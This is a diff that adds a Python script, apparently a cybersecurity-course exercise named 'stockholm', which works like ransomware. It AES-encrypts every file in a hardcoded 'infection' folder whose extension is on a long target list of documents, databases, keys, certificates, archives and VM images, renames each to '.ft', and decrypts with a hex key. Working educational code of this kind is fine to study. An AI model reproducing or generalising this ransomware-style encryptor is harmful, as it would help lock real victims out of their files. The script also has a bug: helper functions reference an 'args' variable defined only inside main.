@@ -1,0 +1,144 @@
+#!/usr/bin/env python
+
+import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import argparse
+import json
+
+def encrypt_file(file_path, key):
+    cipher = AES.new(key, AES.MODE_CBC)
+    iv = cipher.iv  # En cryptographie, un IV (Initialization Vector, ou vecteur d'initialisation en français) est une valeur initiale
+    # L'utilisation d'un IV unique pour chaque fichier ou chaque opération de 
+    #chiffrement permet de produire un chiffrement différent même si le contenu de départ et 
+    #la clé sont les mêmes. Ainsi, cela rend l'analyse de texte chiffré beaucoup plus difficile 
+    #pour un attaquant. bref, chaque fichier a son propre iv
+    with open(file_path, "rb") as f:# Read and encrypt the file content
+        plaintext = f.read()
+    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+
+    with open(file_path, "wb") as f:
+        f.write(iv + ciphertext)
+
+    base_path, original_ext = os.path.splitext(file_path)
+    encrypted_file_path = base_path + ".ft"
+    os.rename(file_path, encrypted_file_path)
+    return encrypted_file_path, original_ext # Return the new file path and original extension for metadata
+
+
+def decrypt_file(file_path, key, original_ext):
+    with open(file_path, "rb") as f:
+        iv = f.read(16)
+        ciphertext = f.read()
+
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+    with open(file_path, "wb") as f:
+        f.write(plaintext)
+
+    base_path, _ = os.path.splitext(file_path)
+    decrypted_file_path = base_path + original_ext
+    os.rename(file_path, decrypted_file_path)
+    return decrypted_file_path
+
+
+def encrypt_files_in_directory(directory, key):
+    valid_extensions = {
+        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+        '.odt', '.ott', '.sxw', '.stw', '.uot', '.pdf',
+        '.txt', '.csv', '.accdb', '.mdb', '.db', '.dbf', 
+        '.sql', '.sln', '.suo', '.mdf', '.ldf', '.jpg',
+        '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', 
+        '.raw', '.nef', '.svg', '.ai', '.psd', '.mp3', 
+        '.wav', '.wma', '.mid', '.mp4', '.avi', '.mov', 
+        '.wmv', '.flv', '.mpeg', '.mpg', '.vob', '.3gp', 
+        '.m4a', '.m4u', '.djvu', '.swf', '.zip', '.rar', 
+        '.7z', '.gz', '.tgz', '.tar', '.bak', '.bz2', 
+        '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.der', 
+        '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', 
+        '.3ds', '.max', '.dwg', '.dxf', '.602', '.hwp', 
+        '.snt', '.one', '.msg', '.eml', '.ost', '.pst', 
+        '.pot', '.potm', '.potx', '.ppam', '.ppsx', 
+        '.ppsm', '.xlsb', '.xlsm', '.dot', '.dotx', 
+        '.dotm', '.docm', '.docb', '.vsdx', '.vsd', 
+        '.sldm', '.sldx'
+    }
+    metadata = {}
+    for filename in os.listdir(directory):
+        file_path = os.path.join(directory, filename)
+        if os.path.isfile(file_path) and os.path.splitext(filename)[1] in valid_extensions :
+            encrypted_file_path, original_ext = encrypt_file(file_path, key)
+            metadata[encrypted_file_path] = original_ext
+            if not args.silent:
+                print(f"Encrypted file: {encrypted_file_path}, Original extension: {original_ext}")
+    # if ".mp6" in valid_extensions:
+    #     print("C'EST VALIDE")
+    # print("PAS VALIDE")
+    with open("metadata.json", "w") as metadata_file: # Enregistrer les métadonnées dans un fichier JSON
+        json.dump(metadata, metadata_file)
+
+
+def decrypt_files_in_directory(directory, key):
+    with open("metadata.json", "r") as metadata_file:# Charger les métadonnées depuis le fichier JSON
+        metadata = json.load(metadata_file)
+
+    for encrypted_file_path, original_ext in metadata.items():
+        encrypted_file_path = os.path.join(directory, os.path.basename(encrypted_file_path))
+        try:
+            decrypted_file_path = decrypt_file(encrypted_file_path, key, original_ext)
+            if not args.silent:
+                print(f"Decrypted file : {decrypted_file_path}")
+        except ValueError as e:
+            print(f"Error while decrypting {encrypted_file_path}: {e}")
+
+
+def load_key(file_path):
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as f:
+            return bytes.fromhex(f.read().strip())
+    return None
+
+
+def save_key(file_path, key):
+    with open(file_path, 'w') as f:
+        f.write(key.hex())
+
+
+def main():
+    try:
+        parser = argparse.ArgumentParser(description="File encryption and decryption")
+        VERSION = "1.0.0"
+        parser.add_argument("-v", "--version", action="version", version=f"%(prog)s {VERSION}", help="Show the version of the program")
+        parser.add_argument("-s", "--silent", action="store_true", help="The program will not show encrypted or decrypted files while running")
+        parser.add_argument("-r", "--reverse", type=str, help="Decrypt the files with the provided key (hex format)")
+        args = parser.parse_args()
+
+        #directory_path = "/Users/melissaadjogoua/Desktop/piscine/stockholm/infection"
+        directory_path = "/mnt/nfs/homes/madjogou/Desktop/piscine_cyber/stockholm/infection"
+        #It must only work in a folder called infection in the user’s HOME directory. donc mettre dans la vm :
+        #directory_path = "/mnt/nfs/homes/infection"
+        key_file_path = 'encryption_key.txt'
+        encryption_key = load_key(key_file_path)
+
+        if encryption_key is None:
+            encryption_key = os.urandom(16)
+            save_key(key_file_path, encryption_key)
+
+        if not args.reverse:
+            encrypt_files_in_directory(directory_path, encryption_key)
+        elif args.reverse:
+            try:
+                provided_key = bytes.fromhex(args.reverse)
+                decrypt_files_in_directory(directory_path, provided_key)
+            except ValueError:
+                print("Error: Invalid hex key for decryption")
+    except KeyboardInterrupt:
+        print("\nProcess interrupted by the user. Exiting safely ✅")
+        exit(1)
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+        exit(1)
+
+
+if __name__ == "__main__":
+    main()
